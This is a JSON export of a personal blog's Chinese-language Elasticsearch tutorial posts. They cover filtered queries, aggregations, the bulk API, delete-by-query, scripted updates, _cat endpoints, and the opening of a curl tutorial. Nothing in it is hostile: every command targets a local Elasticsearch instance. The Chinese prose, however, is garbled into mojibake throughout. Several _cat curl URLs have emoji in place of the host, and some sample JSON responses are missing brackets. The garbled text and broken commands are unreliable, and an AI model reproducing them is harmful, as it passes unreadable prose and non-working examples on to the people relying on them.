&quot;match&quot;: { &quot;age&quot;: &quot;40&quot; } } ], &quot;must_not&quot;: [ { &quot;match&quot;: { &quot;state&quot;: &quot;ID&quot; } } } } }' æ‰§è¡Œè¿‡æ»¤å™¨ åœ¨å…ˆå‰çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬è·³è¿‡äº†æ–‡æ¡£å¾—åˆ†çš„ç»†èŠ‚ï¼ˆæœç´¢ç»“æœä¸­çš„_scoreå­—æ®µï¼‰ã€‚è¿™ä¸ªå¾—åˆ†æ˜¯ä¸æˆ‘ä»¬æŒ‡å®šçš„æœç´¢æŸ¥è¯¢åŒ¹é…ç¨‹åº¦çš„ä¸€ä¸ªç›¸å¯¹åº¦é‡ã€‚å¾—åˆ†è¶Šé«˜ï¼Œæ–‡æ¡£è¶Šç›¸å…³ï¼Œå¾—åˆ†è¶Šä½æ–‡æ¡£çš„ç›¸å…³åº¦è¶Šä½ã€‚ Elasticsearchä¸­çš„æ‰€æœ‰çš„æŸ¥è¯¢éƒ½ä¼šè§¦å‘ç›¸å…³åº¦å¾—åˆ†çš„è®¡ç®—ã€‚å¯¹äºé‚£äº›æˆ‘ä»¬ä¸éœ€è¦ç›¸å…³åº¦å¾—åˆ†çš„åœºæ™¯ä¸‹ï¼ŒElasticsearchä»¥è¿‡æ»¤å™¨çš„å½¢å¼ æä¾›äº†å¦ä¸€ç§æŸ¥è¯¢åŠŸèƒ½ã€‚è¿‡æ»¤å™¨åœ¨æ¦‚å¿µä¸Šç±»ä¼¼äºæŸ¥è¯¢ï¼Œä½†æ˜¯å®ƒä»¬æœ‰éå¸¸å¿«çš„æ‰§è¡Œé€Ÿåº¦ï¼Œè¿™ç§å¿«çš„æ‰§è¡Œé€Ÿåº¦ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸå›  - è¿‡æ»¤å™¨ä¸ä¼šè®¡ç®—ç›¸å…³åº¦çš„å¾—åˆ†ï¼Œæ‰€ä»¥å®ƒä»¬åœ¨è®¡ç®—ä¸Šæ›´å¿«ä¸€äº› - è¿‡æ»¤å™¨å¯ä»¥è¢«ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œè¿™ä½¿å¾—åœ¨é‡å¤çš„æœç´¢æŸ¥è¯¢ä¸Šï¼Œå…¶è¦æ¯”ç›¸åº”çš„æŸ¥è¯¢å¿«å‡ºè®¸å¤šã€‚ ä¸ºäº†ç†è§£è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å…ˆæ¥ä»‹ç»â€œè¢«è¿‡æ»¤â€çš„æŸ¥è¯¢ï¼Œè¿™ä½¿å¾—ä½ å¯ä»¥å°†ä¸€ä¸ªæŸ¥è¯¢ï¼ˆåƒæ˜¯match_allï¼Œmatchï¼Œboolç­‰ï¼‰å’Œä¸€ä¸ªè¿‡æ»¤å™¨ç»“åˆèµ·æ¥ã€‚ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹èŒƒå›´è¿‡æ»¤å™¨ï¼Œå®ƒå…è®¸æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªåŒºé—´çš„å€¼æ¥è¿‡æ»¤æ–‡æ¡£ã€‚è¿™é€šå¸¸è¢«ç”¨åœ¨æ•°å­—å’Œæ—¥æœŸçš„è¿‡æ»¤ä¸Šã€‚ è¿™ä¸ªä¾‹å­ä½¿ç”¨ä¸€ä¸ªè¢«è¿‡æ»¤çš„æŸ¥è¯¢ï¼Œå…¶è¿”å›å€¼æ˜¯è¶Šåœ¨20000åˆ°30000ä¹‹é—´ï¼ˆé—­åŒºé—´ï¼‰çš„è´¦æˆ·ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬æƒ³è¦æ‰¾åˆ°è¶Šå¤§äºç­‰äº20000å¹¶ä¸”å°äºç­‰äº30000çš„è´¦æˆ·ã€‚ curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;filtered&quot;: { &quot;query&quot;: { &quot;match_all&quot;: {} }, &quot;filter&quot;: { &quot;range&quot;: { &quot;balance&quot;: { &quot;gte&quot;: 20000, &quot;lte&quot;: 30000 } } } } } }' åˆ†è§£ä¸Šé¢çš„ä¾‹å­ï¼Œè¢«è¿‡æ»¤çš„æŸ¥è¯¢åŒ…å«ä¸€ä¸ªmatch_allæŸ¥è¯¢ï¼ˆæŸ¥è¯¢éƒ¨åˆ†ï¼‰å’Œä¸€ä¸ªè¿‡æ»¤å™¨ï¼ˆfilteréƒ¨åˆ†ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æŸ¥è¯¢éƒ¨åˆ†ä¸­æ”¾å…¥å…¶ä»–æŸ¥è¯¢ï¼Œåœ¨ filteréƒ¨åˆ†æ”¾å…¥å…¶å®ƒè¿‡æ»¤å™¨ã€‚åœ¨ä¸Šé¢çš„åº”ç”¨åœºæ™¯ä¸­ï¼Œç”±äºæ‰€æœ‰çš„åœ¨è¿™ä¸ªèŒƒå›´ä¹‹å†…çš„æ–‡æ¡£éƒ½æ˜¯å¹³ç­‰çš„ï¼ˆæˆ–è€…è¯´ç›¸å…³åº¦éƒ½æ˜¯ä¸€æ ·çš„ï¼‰ï¼Œæ²¡æœ‰ä¸€ä¸ªæ–‡æ¡£æ¯”å¦ä¸€ä¸ªæ–‡æ¡£ æ›´ç›¸å…³ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ä½¿ç”¨èŒƒå›´è¿‡æ»¤å™¨å°±éå¸¸åˆé€‚äº†ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œè¦å†³å®šæ˜¯ä½¿ç”¨è¿‡æ»¤å™¨è¿˜æ˜¯ä½¿ç”¨æŸ¥è¯¢ï¼Œä½ å°±éœ€è¦é—®è‡ªå·±æ˜¯å¦éœ€è¦ç›¸å…³åº¦å¾—åˆ†ã€‚å¦‚æœç›¸å…³åº¦æ˜¯ä¸é‡è¦çš„ï¼Œä½¿ç”¨è¿‡æ»¤å™¨ï¼Œå¦åˆ™ä½¿ç”¨æŸ¥è¯¢ã€‚å¦‚æœä½ æœ‰SQLèƒŒ æ™¯ï¼ŒæŸ¥è¯¢å’Œè¿‡æ»¤å™¨åœ¨æ¦‚å¿µä¸Šç±»ä¼¼äºSELECT WHEREè¯­å¥ï¼Œ although more so for filters than queriesã€‚ é™¤äº†match_all, match, bool,filteredå’ŒrangeæŸ¥è¯¢ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶å®ƒç±»å‹çš„æŸ¥uxn/è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬è¿™é‡Œä¸ä¼šæ¶‰åŠã€‚ç”±äºæˆ‘ä»¬å·²ç»å¯¹å®ƒä»¬çš„å·¥ä½œåŸç†æœ‰äº†åŸºæœ¬çš„ç†è§£ï¼Œå°†å…¶åº”ç”¨åˆ°å…¶å®ƒç±»å‹çš„æŸ¥è¯¢ã€è¿‡æ»¤å™¨ä¸Šä¹Ÿä¸æ˜¯ä»¶éš¾äº‹ã€‚ æ‰§è¡Œèšåˆ èšåˆæä¾›äº†åˆ†ç»„å¹¶ç»Ÿè®¡æ•°æ®çš„èƒ½åŠ›ã€‚ç†è§£èšåˆçš„æœ€ç®€å•çš„æ–¹å¼æ˜¯å°†å…¶ç²—ç•¥åœ°ç­‰åŒä¸ºSQLçš„GROUP BYå’ŒSQLèšåˆå‡½æ•°ã€‚åœ¨Elasticsearchä¸­ï¼Œä½ å¯ä»¥åœ¨ä¸€ä¸ªå“åº”ä¸­åŒæ—¶è¿”å›å‘½ä¸­çš„æ•°æ®å’Œèšåˆç»“æœã€‚ä½ å¯ä»¥ä½¿ç”¨ç®€å•çš„APIåŒæ—¶è¿è¡ŒæŸ¥è¯¢å’Œå¤šä¸ªèš åˆï¼Œå¹¶ä»¥ä¸€æ¬¡è¿”å›ï¼Œè¿™é¿å…äº†æ¥å›çš„ç½‘ç»œé€šä¿¡ï¼Œè¿™æ˜¯éå¸¸å¼ºå¤§å’Œé«˜æ•ˆçš„ã€‚ ä½œä¸ºå¼€å§‹çš„ä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æŒ‰ç…§stateåˆ†ç»„ï¼ŒæŒ‰ç…§å·åçš„è®¡æ•°å€’åºæ’åºï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;group_by_state&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;state&quot; } } } }' åœ¨SQLä¸­ï¼Œä¸Šé¢çš„èšåˆåœ¨æ¦‚å¿µä¸Šç±»ä¼¼äºï¼š SELECT COUNT(*) from bank GROUP BY state ORDER BY COUNT(*) DESC å“åº”ï¼ˆå…¶ä¸­ä¸€éƒ¨åˆ†ï¼‰æ˜¯ï¼š &quot;hits&quot; : { &quot;total&quot; : 1000, &quot;max_score&quot; : 0.0, &quot;hits&quot; : }, &quot;aggregations&quot; : { &quot;group_by_state&quot; : { &quot;buckets&quot; : [ { &quot;key&quot; : &quot;al&quot;, &quot;doc_count&quot; : 21 }, { &quot;key&quot; : &quot;tx&quot;, &quot;doc_count&quot; : 17 }, { &quot;key&quot; : &quot;id&quot;, &quot;doc_count&quot; : 15 }, { &quot;key&quot; : &quot;ma&quot;, &quot;doc_count&quot; : 15 }, { &quot;key&quot; : &quot;md&quot;, &quot;doc_count&quot; : 15 }, { &quot;key&quot; : &quot;pa&quot;, &quot;doc_count&quot; : 15 }, { &quot;key&quot; : &quot;dc&quot;, &quot;doc_count&quot; : 14 }, { &quot;key&quot; : &quot;me&quot;, &quot;doc_count&quot; : 14 }, { &quot;key&quot; : &quot;mo&quot;, &quot;doc_count&quot; : 14 }, { &quot;key&quot; : &quot;nd&quot;, &quot;doc_count&quot; : 14 } } } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ALï¼ˆabamaï¼‰æœ‰21ä¸ªè´¦æˆ·ï¼ŒTXæœ‰17ä¸ªè´¦æˆ·ï¼ŒIDï¼ˆdahoï¼‰æœ‰15ä¸ªè´¦æˆ·ï¼Œä¾æ­¤ç±»æ¨ã€‚ æ³¨æ„æˆ‘ä»¬å°†sizeè®¾ç½®æˆ0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åªçœ‹åˆ°èšåˆç»“æœäº†ï¼Œè€Œä¸ä¼šæ˜¾ç¤ºå‘½ä¸­çš„ç»“æœã€‚ åœ¨å…ˆå‰èšåˆçš„åŸºç¡€ä¸Šï¼Œç°åœ¨è¿™ä¸ªä¾‹å­è®¡ç®—äº†æ¯ä¸ªå·çš„è´¦æˆ·çš„å¹³å‡ä½™é¢ï¼ˆè¿˜æ˜¯æŒ‰ç…§è´¦æˆ·æ•°é‡å€’åºæ’åºçš„å‰10ä¸ªå·ï¼‰ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;group_by_state&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;state&quot; }, &quot;aggs&quot;: { &quot;average_balance&quot;: { &quot;avg&quot;: { &quot;field&quot;: &quot;balance&quot; } } } } } }' æ³¨æ„ï¼Œæˆ‘ä»¬æŠŠaverage_balanceèšåˆåµŒå¥—åœ¨äº†group_by_stateèšåˆä¹‹ä¸­ã€‚è¿™æ˜¯æ‰€æœ‰èšåˆçš„ä¸€ä¸ªå¸¸ç”¨æ¨¡å¼ã€‚ä½ å¯ä»¥ä»»æ„çš„èšåˆä¹‹ä¸­åµŒå¥—èšåˆï¼Œè¿™æ ·ä½ å°±å¯ä»¥ä»ä½ çš„æ•°æ®ä¸­æŠ½å–å‡ºæƒ³è¦çš„æ¦‚è¿°ã€‚ åŸºäºå‰é¢çš„èšåˆï¼Œç°åœ¨è®©æˆ‘ä»¬æŒ‰ç…§å¹³å‡ä½™é¢è¿›è¡Œæ’åºï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;group_by_state&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;state&quot;, &quot;order&quot;: { &quot;average_balance&quot;: &quot;desc&quot; } }, &quot;aggs&quot;: { &quot;average_balance&quot;: { &quot;avg&quot;: { &quot;field&quot;: &quot;balance&quot; } } } } } }' ä¸‹é¢çš„ä¾‹å­æ˜¾ç¤ºäº†å¦‚ä½•ä½¿ç”¨å¹´é¾„æ®µï¼ˆ20-29ï¼Œ30-39ï¼Œ40-49ï¼‰åˆ†ç»„ï¼Œç„¶ååœ¨ç”¨æ€§åˆ«åˆ†ç»„ï¼Œç„¶åä¸ºæ¯ä¸€ä¸ªå¹´é¾„æ®µçš„æ¯ä¸€ä¸ªæ€§åˆ«è®¡ç®—å¹³å‡è´¦æˆ·ä½™é¢ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;group_by_age&quot;: { &quot;range&quot;: { &quot;field&quot;: &quot;age&quot;, &quot;ranges&quot;: [ { &quot;from&quot;: 20, &quot;to&quot;: 30 }, { &quot;from&quot;: 30, &quot;to&quot;: 40 }, { &quot;from&quot;: 40, &quot;to&quot;: 50 } }, &quot;aggs&quot;: { &quot;group_by_gender&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;gender&quot; }, &quot;aggs&quot;: { &quot;average_balance&quot;: { &quot;avg&quot;: { &quot;field&quot;: &quot;balance&quot; } } } } } } } }' æœ‰å¾ˆå¤šå…³äºèšåˆçš„ç»†èŠ‚ï¼Œæˆ‘ä»¬æ²¡æœ‰æ¶‰åŠã€‚å¦‚æœä½ æƒ³åšæ›´è¿›ä¸€æ­¥çš„å®éªŒï¼Œhttp://www.elasticsearch.org/guide/en /elasticsearch/reference/current/search-aggregations.htmlæ˜¯ä¸€ä¸ªéå¸¸å¥½çš„èµ·ç‚¹ã€‚ æ€»ç»“ Elasticsearchæ—¢æ˜¯ä¸€ä¸ªç®€å•çš„äº§å“ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¤æ‚çš„äº§å“ã€‚æˆ‘ä»¬ç°åœ¨å·²ç»å­¦ä¹ åˆ°äº†åŸºç¡€éƒ¨åˆ†ï¼Œå®ƒçš„ä¸€äº›åŸç†ï¼Œä»¥åŠæ€æ ·ç”¨REST APIæ¥åšä¸€äº›å·¥ä½œã€‚æˆ‘å¸Œæœ›è¿™ä¸ªæ•™ç¨‹å·²ç»ä½¿ä½ å¯¹Elasticsearchæ˜¯ä»€ä¹ˆæœ‰äº†ä¸€ä¸ªæ›´å¥½çš„ç†è§£ï¼Œè·Ÿé‡è¦çš„æ˜¯ï¼Œèƒ½å¤Ÿæ¿€å‘ä½ ç»§ç»­å®éªŒ Elasticsearchçš„å…¶å®ƒç‰¹æ€§ã€‚ è½¬è½½ï¼š http://blog.csdn.net/cnweike/article/details/33736429","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"æ‰¹å¤„ç†","slug":"history/tech/5953c4d0c2b92f5665eed99c","date":"2015-12-23T03:01:50.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed99c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed99c/","excerpt":"","text":"æ‰¹å¤„ç†ï¼šé™¤äº†èƒ½å¤Ÿå¯¹å•ä¸ªçš„æ–‡æ¡£è¿›è¡Œç´¢å¼•ã€æ›´æ–°å’Œåˆ é™¤ä¹‹å¤–ï¼ŒElasticsearchä¹Ÿæä¾›äº†ä»¥ä¸Šæ“ä½œçš„æ‰¹é‡å¤„ç†åŠŸèƒ½ï¼Œè¿™æ˜¯é€šè¿‡ä½¿ç”¨_bulk APIå®ç°çš„ã€‚è¿™ä¸ªåŠŸèƒ½ä¹‹æ‰€ä»¥é‡è¦ï¼Œåœ¨äºå®ƒæä¾›äº†éå¸¸é«˜æ•ˆçš„æœºåˆ¶æ¥å°½å¯èƒ½å¿«çš„å®Œæˆå¤šä¸ªæ“ä½œï¼Œä¸æ­¤åŒæ—¶ä½¿ç”¨å°½å¯èƒ½å°‘çš„ç½‘ç»œå¾€è¿”ã€‚ ä½œä¸ºä¸€ä¸ªå¿«é€Ÿçš„ä¾‹å­ï¼Œä»¥ä¸‹è°ƒç”¨åœ¨ä¸€æ¬¡bulkæ“ä½œä¸­ç´¢å¼•äº†ä¸¤ä¸ªæ–‡æ¡£ï¼ˆID 1 - John Doe and ID 2 - Jane Doeï¼‰: curl -XPOST 'localhost:9200/topics/external/_bulk?pretty' -d ' {&quot;index&quot;:{&quot;_id&quot;:&quot;1&quot;}} {&quot;name&quot;: &quot;John Doe&quot; } {&quot;index&quot;:{&quot;_id&quot;:&quot;2&quot;}} {&quot;name&quot;: &quot;Jane Doe&quot; } ' ä»¥ä¸‹ä¾‹å­åœ¨ä¸€ä¸ªbulkæ“ä½œä¸­ï¼Œé¦–å…ˆæ›´æ–°ç¬¬ä¸€ä¸ªæ–‡æ¡£ï¼ˆIDä¸º1ï¼‰ï¼Œç„¶ååˆ é™¤ç¬¬äºŒä¸ªæ–‡æ¡£ï¼ˆIDä¸º2ï¼‰ï¼š curl -XPOST 'localhost:9200/topics/external/_bulk?pretty' -d ' {&quot;update&quot;:{&quot;_id&quot;:&quot;1&quot;}} {&quot;doc&quot;: { &quot;name&quot;: &quot;John Doe becomes Jane Doe&quot; } } {&quot;delete&quot;:{&quot;_id&quot;:&quot;2&quot;}} ' æ³¨æ„ä¸Šé¢çš„deleteåŠ¨ä½œï¼Œç”±äºåˆ é™¤åŠ¨ä½œåªéœ€è¦è¢«åˆ é™¤æ–‡æ¡£çš„IDï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¯¹åº”çš„æºæ–‡æ¡£ã€‚ bulk APIæŒ‰é¡ºåºæ‰§è¡Œè¿™äº›åŠ¨ä½œã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªåŠ¨ä½œå› ä¸ºæŸäº›åŸå› å¤±è´¥äº†ï¼Œå°†ä¼šç»§ç»­å¤„ç†å®ƒåé¢çš„åŠ¨ä½œã€‚å½“bulk APIè¿”å›æ—¶ï¼Œå®ƒå°†æä¾›æ¯ä¸ªåŠ¨ä½œçš„çŠ¶æ€ï¼ˆæŒ‰ç…§åŒæ ·çš„é¡ºåºï¼‰ï¼Œæ‰€ä»¥ä½ èƒ½å¤Ÿçœ‹åˆ°æŸä¸ªåŠ¨ä½œæˆåŠŸä¸å¦ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"åˆ é™¤æ–‡æ¡£","slug":"history/tech/5953c4d0c2b92f5665eed99b","date":"2015-12-23T03:00:34.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed99b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed99b/","excerpt":"","text":"åˆ é™¤æ–‡æ¡£æ˜¯ç›¸å½“ç›´è§‚çš„ã€‚ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†æˆ‘ä»¬æ€æ ·åˆ é™¤IDä¸º2çš„æ–‡æ¡£ï¼š curl -XDELETE 'localhost:9200/customer/external/2?pretty' æˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿä¸€æ¬¡åˆ é™¤ç¬¦åˆæŸä¸ªæŸ¥è¯¢æ¡ä»¶çš„å¤šä¸ªæ–‡æ¡£ã€‚ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•åˆ é™¤åå­—ä¸­åŒ…å«â€œJohnâ€çš„æ‰€æœ‰çš„å®¢æˆ·ï¼š curl -XDELETE 'localhost:9200/customer/external/_query?pretty' -d ' { &quot;query&quot;: { &quot;match&quot;: { &quot;name&quot;: &quot;John&quot; } } }' æ³¨æ„ï¼Œä»¥ä¸Šçš„URIå˜æˆäº†/_queryï¼Œä»¥æ­¤æ¥è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªâ€œæŸ¥è¯¢åˆ é™¤â€APIï¼Œå…¶ä¸­åˆ é™¤æŸ¥è¯¢æ ‡å‡†æ”¾åœ¨è¯·æ±‚ä½“ä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä½¿ç”¨DELETEã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"æ›´æ–°æ–‡æ¡£","slug":"history/tech/5953c4d0c2b92f5665eed99a","date":"2015-12-23T02:59:56.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed99a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed99a/","excerpt":"","text":"åœ¨ ElasticSearch æ–‡ä»¶ä¸‹ /config/elasticsearch.yml ä¸­åŠ å…¥ï¼šscript.groovy.sandbox.enabled: trueå¦åˆ™ä¼šæŠ¥é”™:{â€œerrorâ€: &quot;ElasticsearchIllegalArgumentException; nested: ScriptException[scripts of type , operation and lang are disabled]; &quot;,â€œstatusâ€: 400}æ›´æ–°æ–‡æ¡£é™¤äº†å¯ä»¥ç´¢å¼•ã€æ›¿æ¢æ–‡æ¡£ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ›´æ–°ä¸€ä¸ªæ–‡æ¡£ã€‚ä½†è¦æ³¨æ„ï¼ŒElasticsearchåº•å±‚å¹¶ä¸æ”¯æŒåŸåœ°æ›´æ–°ã€‚åœ¨æˆ‘ä»¬æƒ³è¦åšä¸€æ¬¡æ›´æ–°çš„æ—¶å€™ï¼ŒElasticsearchå…ˆåˆ é™¤æ—§æ–‡æ¡£ï¼Œç„¶ååœ¨ç´¢å¼•ä¸€ä¸ªæ›´æ–°è¿‡çš„æ–°æ–‡æ¡£ã€‚ ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†æ€æ ·å°†æˆ‘ä»¬IDä¸º1çš„æ–‡æ¡£çš„nameå­—æ®µæ”¹æˆâ€œJane Doeâ€ï¼š curl -XPOST 'localhost:9200/topics/external/1/_update?pretty' -d ' { &quot;doc&quot;: { &quot;name&quot;: &quot;Jane Doe&quot; } }' ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†æ€æ ·å°†æˆ‘ä»¬IDä¸º1çš„æ–‡æ¡£çš„nameå­—æ®µæ”¹æˆâ€œJane Doeâ€çš„åŒæ—¶ï¼Œç»™å®ƒåŠ ä¸Šageå­—æ®µï¼š curl -XPOST 'localhost:9200/topics/external/1/_update?pretty' -d ' { &quot;doc&quot;: { &quot;name&quot;: &quot;Jane Doe&quot;, &quot;age&quot;: 20 } }' æ›´æ–°ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨ç®€å•çš„è„šæœ¬æ¥è¿›è¡Œã€‚è¿™ä¸ªä¾‹å­ä½¿ç”¨ä¸€ä¸ªè„šæœ¬å°†ageåŠ 5ï¼š curl -XPOST 'localhost:9200/topics/external/1/_update?pretty' -d ' { &quot;script&quot; : &quot;ctx._source.age += 5&quot; }' åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œctx._sourceæŒ‡å‘å½“å‰è¦è¢«æ›´æ–°çš„æ–‡æ¡£ã€‚ æ³¨æ„ï¼Œåœ¨å†™ä½œæœ¬æ–‡æ—¶ï¼Œæ›´æ–°æ“ä½œåªèƒ½ä¸€æ¬¡åº”ç”¨åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸Šã€‚å°†æ¥ï¼ŒElasticsearchå°†æä¾›åŒæ—¶æ›´æ–°ç¬¦åˆæŒ‡å®šæŸ¥è¯¢æ¡ä»¶çš„å¤šä¸ªæ–‡æ¡£çš„åŠŸèƒ½ï¼ˆç±»ä¼¼äºSQLçš„UPDATE-WHEREè¯­å¥ï¼‰ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"è·å¾—èŠ‚é›†ç¾¤ä¸­çš„èŠ‚ç‚¹åˆ—è¡¨","slug":"history/tech/5953c4d0c2b92f5665eed995","date":"2015-12-23T02:55:50.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed995/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed995/","excerpt":"","text":"$curl -XGET http://ğŸ˜¡ğŸ˜•_cat/nodes?vhost ip heap.percent ram.percent load node.role master namemyhost 127.0.0.1 36 40 0.00 d * TEST-1","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearch cat","slug":"history/tech/5953c4d0c2b92f5665eed994","date":"2015-12-23T02:52:38.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed994/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed994/","excerpt":"","text":"æ£€æŸ¥é›†ç¾¤å¥åº·ï¼š$curl -XGET http://ğŸ˜¡ğŸ˜•_cat/health?væŸ¥çœ‹èŠ‚ç‚¹ï¼š$curl -XGET http://ğŸ˜¡ğŸ˜•_cat/nodes?vhost ip heap.percent ram.percent load node.role master namemyhost 127.0.0.1 36 40 0.00 d * TEST-1æŸ¥çœ‹ç´¢å¼•:$curl -XGET http://ğŸ˜¡ğŸ˜•_cat/indices?vhealth status index pri rep docs.count docs.deleted store.size pri.store.sizeyellow open profile 5 1 2 0 11.7kb 11.7kbyellow open logstash 5 1 3246 0 4.8mb 4.8mb","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"curl","slug":"history/tech/5953c4d0c2b92f5665eed993","date":"2015-12-23T02:44:27.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed993/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed993/","excerpt":"","text":"åŸæ–‡åœ°å€ï¼š http://www.thegeekstuff.com/2012/04/curl-examples/ä¸‹è½½å•ä¸ªæ–‡ä»¶ï¼Œé»˜è®¤å°†è¾“å‡ºæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºä¸­(STDOUT)ä¸­curl http://www.centos.orgé€šè¿‡-o/-Oé€‰é¡¹ä¿å­˜ä¸‹è½½çš„æ–‡ä»¶åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼š-oï¼šå°†æ–‡ä»¶ä¿å­˜ä¸ºå‘½ä»¤è¡Œä¸­æŒ‡å®šçš„æ–‡ä»¶åçš„æ–‡ä»¶ä¸­-Oï¼šä½¿ç”¨URLä¸­é»˜è®¤çš„æ–‡ä»¶åä¿å­˜æ–‡ä»¶åˆ°æœ¬åœ°1 # å°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¹¶å‘½åä¸ºmygettext.html2 curl -o mygettext.html 